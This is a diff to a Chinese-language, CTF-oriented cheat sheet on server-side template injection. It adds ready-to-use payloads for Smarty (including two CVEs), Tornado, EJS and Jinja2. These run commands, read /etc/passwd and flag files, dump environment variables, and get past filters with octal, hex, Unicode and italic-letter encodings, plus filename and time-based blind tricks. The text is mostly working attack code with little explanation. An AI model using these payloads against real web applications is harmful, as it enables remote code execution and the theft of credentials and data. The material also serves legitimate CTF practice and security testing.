@@ -301,13 +301,36 @@ __${T(java.lang.Runtime).getRuntime().exec('id')}__::.x
 
 ### 探测
 ```
-{php}phpinfo(){/php}
+{$smarty.version}        # 返回版本信息
+{7*7} = 49              # Smarty 模板标记
 ```
 
 ### 命令执行
 ```php
+{php}phpinfo();{/php}            # PHP 代码执行（旧版本）
 {php}system('id');{/php}
-{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php system('id');?>",self::clearCompileId())}
+
+{if phpinfo()}{/if}
+{if readfile('/flag')}{/if}
+{if show_source('/flag')}{/if}
+{if system('cat /flag')}{/if}
+```
+
+### {literal} 标签（PHP 5.x）
+```php
+{literal}<script language="php">xxx</script>;{/literal}
+```
+PHP 7 中 `{literal}` 中间内容会原样输出，不解析。
+
+### CVE-2021-26120（Smarty < 3.1.39）
+```php
+{function name='rce(){};phpinfo();function '}{/function}
+```
+
+### CVE-2021-29454（Smarty < 3.1.42 / < 4.0.2）
+```php
+{math equation='("\163\171\163\164\145\155")("\167\150\157\141\155\151")'}
+# system("whoami") - 八进制编码
 ```
 
 ## Mako (Python)
@@ -319,10 +342,68 @@ ${self.module.runtime.globals['__builtins__']['__import__']('os').popen('id').re
 
 ## Tornado (Python)
 
+### 模板语法
+```python
+{{ variable }}           # 变量输出
+{% if condition %}...{% end %}    # 条件
+{% for item in items %}...{% end %}  # 循环
+{# comment #}            # 注释
+{% extends "base.html" %}  # 继承
+```
+
+### 危险渲染
+```python
+# 危险：直接渲染用户输入
+self.render_string(user_input)
+self.render(user_input + ".html")
+self.render("template.html", content=user_input)
+```
+
 ### 命令执行
 ```python
-{% import os %}
-{{ os.popen('id').read() }}
+# 直接导入模块
+{{ __import__("os").popen("id").read() }}
+{{ __import__("subprocess").check_output("ls", shell=True) }}
+
+# 通过 handler 对象
+{{ handler.settings }}
+{{ handler.request.connection.stream.socket.getpeername() }}
+
+# 对象链（类似Jinja2）
+{{ "".__class__.__mro__[1].__subclasses__() }}
+{{ "".__class__.__base__.__subclasses__() }}
+
+# 使用open读取
+{{ open("/etc/passwd").read() }}
+{{ __import__("os").listdir("/") }}
+```
+
+### 绕过技巧
+```python
+# 字符串拼接
+{{ [].__class__.__base__.__subclasses__()[59].__init__.__globals__['__builtins__']['__imp'+'ort__']('os') }}
+
+# format构造
+{{ "%c%c" % (111, 115) }}  # 构造"os"
+
+# Base64/Hex编码
+{{ __import__("base64").b64decode("b3M=") }}
+{{ __import__("binascii").unhexlify("6f73") }}
+
+# []访问替代
+{{ __import__("os")["popen"]("id")["read"]() }}
+{{ getattr(__import__("os"), "popen")("id").read() }}
+
+# 属性链
+{{ ().__class__.__bases__[0].__subclasses__()[40]("/etc/passwd").read() }}
+```
+
+### 检测
+```python
+{{ 7*7 }}        # 返回49 → 存在SSTI
+{{ "abc" }}      # 输出abc
+{{ handler.settings }}  # 暴露配置
+{{ 1/0 }}        # 错误信息泄露
 ```
 
 ## Django (Python)
@@ -342,10 +423,154 @@ ${self.module.runtime.globals['__builtins__']['__import__']('os').popen('id').re
 {{ settings.SECRET_KEY }}
 ```
 
+## EJS (Node.js/Express)
+
+### 检测
+```javascript
+<%= 7*7 %>     // 返回49 → 存在SSTI
+<%= 1+1 %>     // 返回2
+```
+
+### 命令执行
+```javascript
+// 信息收集
+<%= JSON.stringify(process.env) %>
+<%= this %>
+<%= process.env.FLAG %>
+
+// 文件读取
+<% const fs = require('fs') %>
+<%= fs.readFileSync('/etc/passwd', 'utf8') %>
+<%= require('fs').readFileSync('./app.js', 'utf8') %>
+
+// 命令执行
+<% const { execSync } = require('child_process') %>
+<%= execSync('whoami').toString() %>
+<%= global.process.mainModule.require('child_process').spawnSync('env').stdout.toString() %>
+```
+
+### 自定义分隔符绕过
+```
+// EJS 允许自定义 delimiter 选项
+// 如果 ?delimiter=* 可控，则可用 <* *> 替代 <% %>
+```
+
+### outputFunctionName 污染
+```
+// 通过原型链污染 EJS 的 outputFunctionName
+// 在渲染时执行注入的 Node.js 代码
+```
+
 ## Pug/Jade (Node.js)
 
 ### 命令执行
 ```javascript
 - var x = process.mainModule.require('child_process').execSync('id')
 = x
+```
+
+## Make (Python)
+
+模板标记符：`<%%>`
+
+参考: https://xz.aliyun.com/news/11633
+
+---
+
+## Jinja2 高级绕过
+
+### 斜体字符绕过 (eval 内)
+
+```
+# Unicode 数学斜体字符可绕过关键词检测
+𝒶𝒷𝒸𝒹ℯ𝒻ℊ𝒽𝒾𝒿𝓀𝓁𝓂𝓃ℴ𝓅𝓆𝓇𝓈𝓉𝓊𝓋𝓌𝓍𝓎𝓏𝒜ℬ𝒞𝒟ℰℱ𝒢ℋℐ𝒥𝒦ℒℳ𝒩𝒪𝒫𝒬ℛ𝒮𝒯𝒰𝒱𝒲𝒳𝒴𝒵
+𝘢𝘣𝘤𝘥𝘦𝘧𝘨𝘩𝘪𝘫𝘬𝘭𝘮𝘯𝘰𝘱𝘲𝘳𝘴𝘵𝘶𝘷𝘸𝘹𝘺𝘻𝘈𝘉𝘊𝘋𝘌𝘍𝘎𝘏𝘐𝘑𝘒𝘓𝘔𝘕𝘖𝘗𝘘𝘙𝘚𝘛𝘜𝘝𝘞𝘟𝘠𝘡
+
+# 替换 eval 内的关键词
+_＿𝒾𝓂𝓅ℴ𝓇𝓉_＿('os').𝓅ℴ𝓅ℯ𝓃('whoami').𝓇ℯ𝒶𝒹()
+
+# 完整 payload
+{{url_for.__globals__['__builtins__']['eval']("_＿𝒾𝓂𝓅ℴ𝓇𝓉_＿('os').𝓅ℴ𝓅ℯ𝓃('whoami').𝓇ℯ𝒶𝒹()")}}
+```
+
+### 编码绕过（引号内字符串）
+
+```python
+# 八进制编码
+{{''["\137\137\143\154\141\163\163\137\137"]["\137\137\155\162\157\137\137"][1]["\137\137\163\165\142\143\154\141\163\163\145\163\137\137"]()[137]["\137\137\151\156\151\164\137\137"]["\137\137\147\154\157\142\141\154\163\137\137"]['\137\137\142\165\151\154\164\151\156\163\137\137']['\145\166\141\154']("\137\137\151\155\160\157\162\164\137\137\050\047\157\163\047\051\056\160\157\160\145\156\050\047\154\163\040\057\047\051\056\162\145\141\144\050\051")}}
+
+# 十六进制编码
+{{''["\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f"]["\x5f\x5f\x6d\x72\x6f\x5f\x5f"][1]["\x5f\x5f\x73\x75\x62\x63\x6c\x61\x73\x73\x65\x73\x5f\x5f"]()[137]["\x5f\x5f\x69\x6e\x69\x74\x5f\x5f"]["\x5f\x5f\x67\x6c\x6f\x62\x61\x6c\x73\x5f\x5f"]['\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f']['\x65\x76\x61\x6c']("\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x27\x6f\x73\x27\x29\x2e\x70\x6f\x70\x65\x6e\x28\x27\x6c\x73\x20\x2f\x27\x29\x2e\x72\x65\x61\x64\x28\x29")}}
+
+# Unicode 编码
+{{''["\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f"]["\u005f\u005f\u006d\u0072\u006f\u005f\u005f"][1]["\u005f\u005f\u0073\x75\..."]...}}
+```
+
+### 关键字绕过补充
+
+```python
+# [xxx] 被过滤 → 用 __getitem__(xx) 绕过
+{{''.__class__.__mro__.__getitem__(2)}}
+
+# 单引号被过滤 → 用 flask request 传参
+{{(lipsum|attr(request.values.a)).get(request.values.b).popen(request.values.c).read()}}
+# ?a=__globals__&b=os&c=cat /flag
+
+# __globals__ 被过滤 → attr 过滤
+{{lipsum|attr("__globals__")}}
+
+# {} 被过滤 → {%print()%} 替代 {{}}
+
+# 获取符号的方法: 用内置函数转换为 list 后按下标取
+lipsum|string|list  # 转化为 list 后指定下标取字符
+
+# 字典创建 + join
+{% set po=dict(po=a,p=a)|join%}
+{% set a=(()|select|string|list)|attr(po)(24)%}
+
+# _frozen_importlib.BuiltinImporter 存在时
+# 调用 ["load_module"]("os")["popen"]("ls /").read()}}
+
+# subprocess.Popen 存在时
+# 调用 ('ls /',shell=True,stdout=-1).communicate()[0].strip()}}
+```
+
+### Fenjing 自动化工具
+
+```bash
+# https://github.com/Marven11/Fenjing
+# 本地起服务，替换 waf 即可自动绕过
+
+# 用法: 指向被 SSTI 的 endpoint，Fenjing 会自动生成绕过 payload
+```
+
+### 文件名 SSTI（无回显场景）
+
+```python
+# 将 payload 写入文件，通过文件包含触发
+def escape_string(s):
+    replacements = {
+        '{': r'\{', '}': r'\}', '[': r'\[', ']': r'\]',
+        '(': r'\(', ')': r'\)', "'": r"\'", '"': r'\"',
+    }
+    for char, replacement in replacements.items():
+        s = s.replace(char, replacement)
+    return s
+
+original = """{{x.__init__.__globals__['__builtins__']['eval']("__import__('os').popen('\\\\143'+'\\\\141'+'\\\\164'+'\\\\40'+'\\\\57'+'\\\\146'+'\\\\52').read()")}}"""
+escaped = escape_string(original)
+# 创建文件: vim \{\{x.__init__.__globals__...
+```
+
+---
+
+## 盲 SSTI 补充
+
+### DNS 外带（比赛环境不能出网，此法跳过）
+### HTTP 外带（比赛环境不能出网，此法跳过）
+
+### 时间盲注（本地可用）
+```python
+{{lipsum.__globals__.os.popen('sleep 3').read()}}
+{%if lipsum.__globals__.os.popen('sleep 3').read()%}{%endif%}
 ```
